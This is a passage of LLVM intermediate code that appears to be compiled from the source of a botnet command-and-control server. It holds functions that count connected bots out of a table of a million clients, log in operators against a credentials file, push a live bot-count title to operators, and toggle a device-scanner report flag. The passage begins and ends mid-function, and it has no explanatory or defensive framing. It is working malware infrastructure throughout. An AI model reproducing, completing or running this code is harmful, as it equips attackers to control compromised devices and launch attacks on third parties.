  %192 = sext i32 %191 to i64
  store i64 %192, i64* %16, align 8
  %193 = icmp sgt i64 %192, 0
  br label %194

194:                                              ; preds = %188, %185
  %195 = phi i1 [ false, %185 ], [ %193, %188 ]
  br i1 %195, label %196, label %236

196:                                              ; preds = %194
  %197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %199 = icmp eq i8* %198, null
  br i1 %199, label %200, label %201

200:                                              ; preds = %196
  store i32 1, i32* %15, align 4
  br label %236

201:                                              ; preds = %196
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %202)
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %212

206:                                              ; preds = %201
  %207 = load i32, i32* %13, align 4
  %208 = call i64 @send(i32 %207, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i64 5, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %206
  store i32 1, i32* %15, align 4
  br label %236

211:                                              ; preds = %206
  br label %185, !llvm.loop !13

212:                                              ; preds = %201
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0)) #8
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %216 = icmp eq i8* %214, %215
  br i1 %216, label %217, label %220

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0)) #8
  store i8* %219, i8** %18, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %185, !llvm.loop !13

220:                                              ; preds = %212
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %222 = call i8* @strstr(i8* %221, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0)) #8
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %224 = icmp eq i8* %222, %223
  br i1 %224, label %225, label %228

225:                                              ; preds = %220
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = call i8* @strstr(i8* %226, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0)) #8
  store i8* %227, i8** %19, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %185, !llvm.loop !13

228:                                              ; preds = %220
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #8
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %233

232:                                              ; preds = %228
  br label %185, !llvm.loop !13

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %234)
  br label %185, !llvm.loop !13

236:                                              ; preds = %210, %200, %194
  %237 = load i64, i64* %16, align 8
  %238 = icmp eq i64 %237, -1
  br i1 %238, label %239, label %245

239:                                              ; preds = %236
  %240 = call i32* @__errno_location() #10
  %241 = load i32, i32* %240, align 4
  %242 = icmp ne i32 %241, 11
  br i1 %242, label %243, label %244

243:                                              ; preds = %239
  store i32 1, i32* %15, align 4
  br label %244

244:                                              ; preds = %243, %239
  br label %259

245:                                              ; preds = %236
  %246 = load i64, i64* %16, align 8
  %247 = icmp eq i64 %246, 0
  br i1 %247, label %248, label %249

248:                                              ; preds = %245
  store i32 1, i32* %15, align 4
  br label %259

249:                                              ; preds = %245
  br label %250

250:                                              ; preds = %249
  %251 = load i32, i32* %15, align 4
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %253, label %258

253:                                              ; preds = %250
  %254 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %255 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %254, i32 0, i32 1
  store i8 0, i8* %255, align 4
  %256 = load i32, i32* %13, align 4
  %257 = call i32 @close(i32 %256)
  br label %258

258:                                              ; preds = %253, %250
  br label %183

259:                                              ; preds = %248, %244
  br label %260

260:                                              ; preds = %259
  br label %261

261:                                              ; preds = %260
  br label %262

262:                                              ; preds = %261, %169, %57
  %263 = load i32, i32* %7, align 4
  %264 = add nsw i32 %263, 1
  store i32 %264, i32* %7, align 4
  br label %26, !llvm.loop !14

265:                                              ; preds = %26
  br label %22
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %19
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.13, i64 0, i64 0), i32 27, i32 %10, i32 7) #9
  %12 = load i32, i32* %3, align 4
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = call i64 @strlen(i8* %14) #8
  %16 = call i64 @send(i32 %12, i8* %13, i64 %15, i32 16384)
  %17 = icmp eq i64 %16, -1
  br i1 %17, label %18, label %19

18:                                               ; preds = %7
  ret i8* null

19:                                               ; preds = %7
  %20 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [800 x i8], align 16
  %33 = alloca [800 x i8], align 16
  %34 = alloca [800 x i8], align 16
  %35 = alloca [800 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [2048 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca %struct._IO_FILE*, align 8
  %41 = alloca i64, align 8
  %42 = alloca %struct.tm*, align 8
  %43 = alloca [50 x i8], align 16
  %44 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i32
  store i32 %46, i32* %4, align 4
  %47 = load volatile i32, i32* @OperatorsConnected, align 4
  %48 = add nsw i32 %47, 1
  store volatile i32 %48, i32* @OperatorsConnected, align 4
  %49 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %49, i8 0, i64 2048, i1 false)
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %50, i8 0, i64 2048, i1 false)
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %51, i8 0, i64 2048, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %52, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %53 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  store %struct._IO_FILE* %53, %struct._IO_FILE** %13, align 8
  br label %54

54:                                               ; preds = %59, %1
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %56 = call i32 @feof(%struct._IO_FILE* %55) #9
  %57 = icmp ne i32 %56, 0
  %58 = xor i1 %57, true
  br i1 %58, label %59, label %64

59:                                               ; preds = %54
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %61 = call i32 @fgetc(%struct._IO_FILE* %60)
  store i32 %61, i32* %15, align 4
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %14, align 4
  br label %54, !llvm.loop !17

64:                                               ; preds = %54
  store i32 0, i32* %16, align 4
  %65 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %65)
  br label %66

66:                                               ; preds = %71, %64
  %67 = load i32, i32* %16, align 4
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 %68, 1
  %70 = icmp ne i32 %67, %69
  br i1 %70, label %71, label %86

71:                                               ; preds = %66
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %73 = load i32, i32* %16, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %74
  %76 = getelementptr inbounds %struct.login_info, %struct.login_info* %75, i32 0, i32 0
  %77 = getelementptr inbounds [100 x i8], [100 x i8]* %76, i64 0, i64 0
  %78 = load i32, i32* %16, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %79
  %81 = getelementptr inbounds %struct.login_info, %struct.login_info* %80, i32 0, i32 1
  %82 = getelementptr inbounds [100 x i8], [100 x i8]* %81, i64 0, i64 0
  %83 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %72, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i8* %77, i8* %82)
  %84 = load i32, i32* %16, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %16, align 4
  br label %66, !llvm.loop !18

86:                                               ; preds = %66
  %87 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %87, i8 0, i64 2048, i1 false)
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %89 = call i32 (i8*, i8*, ...) @sprintf(i8* %88, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #9
  %90 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %91 = call i32 (i8*, i8*, ...) @sprintf(i8* %90, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.16, i64 0, i64 0)) #9
  %92 = load i32, i32* %4, align 4
  %93 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %94 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %95 = call i64 @strlen(i8* %94) #8
  %96 = call i64 @send(i32 %92, i8* %93, i64 %95, i32 16384)
  %97 = icmp eq i64 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %86
  br label %557

99:                                               ; preds = %86
  %100 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %101 = load i32, i32* %4, align 4
  %102 = call i32 @fdgets(i8* %100, i32 2048, i32 %101)
  %103 = icmp slt i32 %102, 1
  br i1 %103, label %104, label %105

104:                                              ; preds = %99
  br label %557

105:                                              ; preds = %99
  %106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %106)
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %108
  %110 = getelementptr inbounds %struct.login_info, %struct.login_info* %109, i32 0, i32 0
  %111 = getelementptr inbounds [100 x i8], [100 x i8]* %110, i64 0, i64 0
  %112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %113 = call i32 (i8*, i8*, ...) @sprintf(i8* %111, i8* %112) #9
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %114, i8** %19, align 8
  %115 = load i8*, i8** %19, align 8
  %116 = call i32 @Find_Login(i8* %115)
  store i32 %116, i32* %5, align 4
  %117 = load i8*, i8** %19, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %119
  %121 = getelementptr inbounds %struct.login_info, %struct.login_info* %120, i32 0, i32 0
  %122 = getelementptr inbounds [100 x i8], [100 x i8]* %121, i64 0, i64 0
  %123 = call i32 @strcmp(i8* %117, i8* %122) #8
  %124 = icmp eq i32 %123, 0
  br i1 %124, label %125, label %167

125:                                              ; preds = %105
  %126 = load i32, i32* %4, align 4
  %127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %128 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %129 = call i64 @strlen(i8* %128) #8
  %130 = call i64 @send(i32 %126, i8* %127, i64 %129, i32 16384)
  %131 = icmp eq i64 %130, -1
  br i1 %131, label %132, label %133

132:                                              ; preds = %125
  br label %557

133:                                              ; preds = %125
  %134 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %136
  %138 = getelementptr inbounds %struct.login_info, %struct.login_info* %137, i32 0, i32 0
  %139 = getelementptr inbounds [100 x i8], [100 x i8]* %138, i64 0, i64 0
  %140 = call i32 (i8*, i8*, ...) @sprintf(i8* %134, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.18, i64 0, i64 0), i8* %139) #9
  %141 = load i32, i32* %4, align 4
  %142 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %143 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %144 = call i64 @strlen(i8* %143) #8
  %145 = call i64 @send(i32 %141, i8* %142, i64 %144, i32 16384)
  %146 = icmp eq i64 %145, -1
  br i1 %146, label %147, label %148

147:                                              ; preds = %133
  br label %557

148:                                              ; preds = %133
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %150 = load i32, i32* %4, align 4
  %151 = call i32 @fdgets(i8* %149, i32 2048, i32 %150)
  %152 = icmp slt i32 %151, 1
  br i1 %152, label %153, label %154

153:                                              ; preds = %148
  br label %557

154:                                              ; preds = %148
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %155)
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %157 = load i32, i32* %5, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %158
  %160 = getelementptr inbounds %struct.login_info, %struct.login_info* %159, i32 0, i32 1
  %161 = getelementptr inbounds [100 x i8], [100 x i8]* %160, i64 0, i64 0
  %162 = call i32 @strcmp(i8* %156, i8* %161) #8
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

164:                                              ; preds = %154
  br label %168

165:                                              ; preds = %154
  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %166, i8 0, i64 2048, i1 false)
  br label %174

167:                                              ; preds = %105
  br label %168

168:                                              ; preds = %167, %164
  %169 = load i32, i32* %4, align 4
  %170 = call i64 @send(i32 %169, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0), i64 5, i32 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %173

172:                                              ; preds = %168
  br label %557

173:                                              ; preds = %168
  br label %557

174:                                              ; preds = %165
  %175 = load i8*, i8** %3, align 8
  %176 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %175) #9
  %177 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %178 = call i32 (i8*, i8*, ...) @sprintf(i8* %177, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i64 0, i64 0)) #9
  %179 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %180 = call i32 (i8*, i8*, ...) @sprintf(i8* %179, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0)) #9
  %181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %182 = call i32 (i8*, i8*, ...) @sprintf(i8* %181, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.21, i64 0, i64 0)) #9
  %183 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %184 = call i32 (i8*, i8*, ...) @sprintf(i8* %183, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.22, i64 0, i64 0)) #9
  %185 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %186 = call i32 (i8*, i8*, ...) @sprintf(i8* %185, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.23, i64 0, i64 0)) #9
  %187 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %188 = call i32 (i8*, i8*, ...) @sprintf(i8* %187, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.24, i64 0, i64 0)) #9
  %189 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %190 = call i32 (i8*, i8*, ...) @sprintf(i8* %189, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.25, i64 0, i64 0)) #9
  %191 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %192 = call i32 (i8*, i8*, ...) @sprintf(i8* %191, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.26, i64 0, i64 0)) #9
  %193 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %194 = call i32 (i8*, i8*, ...) @sprintf(i8* %193, i8* getelementptr inbounds ([104 x i8], [104 x i8]* @.str.27, i64 0, i64 0)) #9
  %195 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %196 = call i32 (i8*, i8*, ...) @sprintf(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0)) #9
  %197 = load i32, i32* %4, align 4
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %199 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %200 = call i64 @strlen(i8* %199) #8
  %201 = call i64 @send(i32 %197, i8* %198, i64 %200, i32 16384)
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %204

203:                                              ; preds = %174
  br label %557

204:                                              ; preds = %174
  %205 = load i32, i32* %4, align 4
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %208 = call i64 @strlen(i8* %207) #8
  %209 = call i64 @send(i32 %205, i8* %206, i64 %208, i32 16384)
  %210 = icmp eq i64 %209, -1
  br i1 %210, label %211, label %212

211:                                              ; preds = %204
  br label %557

212:                                              ; preds = %204
  %213 = load i32, i32* %4, align 4
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %216 = call i64 @strlen(i8* %215) #8
  %217 = call i64 @send(i32 %213, i8* %214, i64 %216, i32 16384)
  %218 = icmp eq i64 %217, -1
  br i1 %218, label %219, label %220

219:                                              ; preds = %212
  br label %557

220:                                              ; preds = %212
  %221 = load i32, i32* %4, align 4
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %223 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %224 = call i64 @strlen(i8* %223) #8
  %225 = call i64 @send(i32 %221, i8* %222, i64 %224, i32 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %228

227:                                              ; preds = %220
  br label %557

228:                                              ; preds = %220
  %229 = load i32, i32* %4, align 4
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %231 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %232 = call i64 @strlen(i8* %231) #8
  %233 = call i64 @send(i32 %229, i8* %230, i64 %232, i32 16384)
  %234 = icmp eq i64 %233, -1
  br i1 %234, label %235, label %236

235:                                              ; preds = %228
  br label %557

236:                                              ; preds = %228
  %237 = load i32, i32* %4, align 4
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %239 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %240 = call i64 @strlen(i8* %239) #8
  %241 = call i64 @send(i32 %237, i8* %238, i64 %240, i32 16384)
  %242 = icmp eq i64 %241, -1
  br i1 %242, label %243, label %244

243:                                              ; preds = %236
  br label %557

244:                                              ; preds = %236
  %245 = load i32, i32* %4, align 4
